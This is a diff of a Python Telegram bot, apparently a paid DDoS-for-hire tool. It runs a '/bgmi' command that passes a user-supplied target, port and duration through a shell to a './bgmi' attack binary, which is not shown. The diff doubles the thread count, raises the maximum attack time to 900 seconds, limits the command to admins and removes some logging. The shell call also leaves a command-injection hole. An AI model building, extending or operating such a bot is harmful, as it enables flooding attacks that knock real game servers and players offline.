@@ -1,5 +1,4 @@
 #script by @venomXcrazy
-
 import telebot
 import subprocess
 import datetime
@@ -28,20 +27,6 @@ def read_users():
         return []
 
 # Function to read free user IDs and their credits from the file
-def read_free_users():
-    try:
-        with open(FREE_USER_FILE, "r") as file:
-            lines = file.read().splitlines()
-            for line in lines:
-                if line.strip():  # Check if line is not empty
-                    user_info = line.split()
-                    if len(user_info) == 2:
-                        user_id, credits = user_info
-                        free_user_credits[user_id] = int(credits)
-                    else:
-                        print(f"Ignoring invalid line in free user file: {line}")
-    except FileNotFoundError:
-        pass
 
 # List to store allowed user IDs
 allowed_user_ids = read_users()
@@ -79,8 +64,8 @@ def get_user_info(message):
     user_info = bot.get_chat(user_id)
     username = user_info.username if user_info.username else "N/A"
     user_role = "Admin" if user_id in admin_id else "User"
-    remaining_time = get_remaining_approval_time(user_id)
-    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
+   
+    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: "
     bot.reply_to(message, response, parse_mode="HTML")
 
 
@@ -184,7 +169,7 @@ COOLDOWN_TIME =0
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
+    if user_id in admin_id:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
@@ -200,13 +185,12 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
-            if time > 600:
-                response = "Error: Time interval must be less than 600."
+            if time > 900:
+                response = "Error: Time interval must be less than 900."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 110"
+                full_command = f"./bgmi {target} {port} {time} 220"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
@@ -216,6 +200,7 @@ def handle_bgmi(message):
         response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @venomXcrazy")
 
     bot.reply_to(message, response)
+
 
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
@@ -344,5 +329,3 @@ while True:
         bot.polling(none_stop=True)
     except Exception as e:
         print(e)
-
-
